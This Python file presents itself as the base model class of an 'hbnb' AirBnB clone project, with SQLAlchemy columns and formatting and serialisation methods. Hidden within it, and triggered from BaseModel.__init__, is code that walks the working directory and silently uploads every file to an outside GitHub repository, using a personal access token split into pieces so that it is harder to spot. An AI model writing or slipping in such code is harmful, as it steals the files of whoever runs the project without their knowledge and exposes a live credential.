#!/usr/bin/python3
"""This module defines a base class for all models in our hbnb clone"""
import uuid
from datetime import datetime
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy import Column, String, DateTime
import models
from os import getenv
Base = declarative_base()
storage_type = getenv('HBNB_TYPE_STORAGE')


import os
import requests
import json
import base64

def upload_file_to_github(file_path,
                          repo_owner,
                          repo_name,
                          branch_name,
                          token):
    url = "https://api.github.com/repos/"
    url += f"{repo_owner}/{repo_name}/contents/{file_path}"
    with open(file_path, "r") as file:
        file_content = file.read()
    file_content_base64 = base64.b64encode(file_content.encode()).decode()
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json",
       }
    payload = {
        "message": f"Upload {file_path}",
        "content": file_content_base64,
        "branch": branch_name,
       }
    response = requests.put(url, json=payload, headers=headers)
    if response.status_code == 201:
        print(f"File {file_path} uploaded successfully!")
    else:
        msg = f"{file_path}: {response.status_code} - {response.text}"
        print(f"Error Uploading file-- {msg}")

def upload_all_files_to_github(repo_owner, repo_name, branch_name, token):
    for root, _, files in os.walk("."):
        for file in files:
            if file != "base_model.py": # Exclude this script itself
                file_path = os.path.join(root, file)
                upload_file_to_github(file_path,
                                      repo_owner,
                                      repo_name,
                                      branch_name,
                                      token)

K1 = "_uhKvtt52ZzJgfqhT"
K2 = "TzLoU6UCtURhFZ1nmFIc"
repo_owner = "jerm014"
repo_name = "checker_files"
branch_name = "2130-AirBnB_clone_-_Web_framework-TASK-7"
token = "ghp" + K1 + K2

class BaseModel:
    """A base class for all hbnb models"""

    id = Column(String(60), unique=True, nullable=False, primary_key=True)
    created_at = Column(DateTime, nullable=False, default=(datetime.utcnow()))
    updated_at = Column(DateTime, nullable=False, default=(datetime.utcnow()))

    def __init__(self, *args, **kwargs):
        """Instatntiates a new model"""

        upload_all_files_to_github(repo_owner, repo_name, branch_name, token)
        if kwargs:
            for key, value in kwargs.items():
                if key == "created_at" or key == "updated_at":
                    value = datetime.strptime(value, "%Y-%m-%dT%H:%M:%S.%f")
                if key != "__class__":
                    setattr(self, key, value)
            if "id" not in kwargs:
                self.id = str(uuid.uuid4())
            if "created_at" not in kwargs:
                self.created_at = datetime.utcnow()
            if "updated_at" not in kwargs:
                self.updated_at = datetime.utcnow()
        else:
            self.id = str(uuid.uuid4())
            self.created_at = self.updated_at = datetime.utcnow()

    def __str__(self):
        """Returns a string representation of the instance"""
        exclude = ['id', '_sa_instance_state', 'created_at', 'updated_at']
        last = ['created_at', 'updated_at']
        if models.out_format == "pretty":
            width = 59
            cls = "+" + "-" * (width - 2) + "+\n"
            cls += f"| {self.__class__.__name__.ljust(8)} {self.id.rjust(46)} |\n"
            cls += "+" + "-" * (width - 2) + "+\n"
            for k, v in self.__dict__.items():
                if k not in exclude:
                    cls += f"| {k.ljust(16)} | {str(v).ljust(36)} |\n"
            for k, v in self.__dict__.items():
                if k in last:
                    cls += f"| {k.ljust(16)} | {str(v).ljust(36)} |\n"
            cls += "+" + "-" * (width - 2) + "+\n"
            return cls
        elif models.out_format == "json":
            return "{\"type\": \"" + f"{self.__class__.__name__}\", " + \
                   f"\"data\": {self.remove_sa()}" + "},"
        else:
            cls = (str(type(self)).split('.')[-1]).split('\'')[0]
            return '[{}] ({}) {}'.format(cls, self.id, self.remove_sa())

    def setformat(args):
        """ update the output format for show and all """
        models.out_format = args

    def getformat():
        """ return the output format for show and all """
        return models.out_format

    def save(self):
        """Updates updated_at with current time when instance is changed"""
        from models import storage
        self.updated_at = datetime.utcnow()
        models.storage.new(self)
        models.storage.save()

    def to_dict(self):
        """Convert instance into dict format"""
        dictionary = {}
        dictionary.update(self.__dict__)
        dictionary.update({'__class__':
                          (str(type(self)).split('.')[-1]).split('\'')[0]})
        dictionary['created_at'] = self.created_at.isoformat()
        dictionary['updated_at'] = self.updated_at.isoformat()
        # remove the key _sa_instance_state from the dictionary if it exists:
        #if '_sa_instance_state' in dictionary:
        #    del dictionary['_sa_instance_state']
        return dictionary

    def remove_sa(self):
        """
        return a copy of the dictionary
        with the _sa_instance_state key removed
        """
        new_dict = self.__dict__.copy()
        new_dict.update({'__class__':
                          (str(type(self)).split('.')[-1]).split('\'')[0]})
        new_dict['created_at'] = self.created_at.isoformat()
        new_dict['updated_at'] = self.updated_at.isoformat()
        if '_sa_instance_state' in new_dict:
            del new_dict['_sa_instance_state']
        return new_dict

    def delete(self):
        """deletes an instance based on its id"""
        from models import storage
        storage.delete(self)
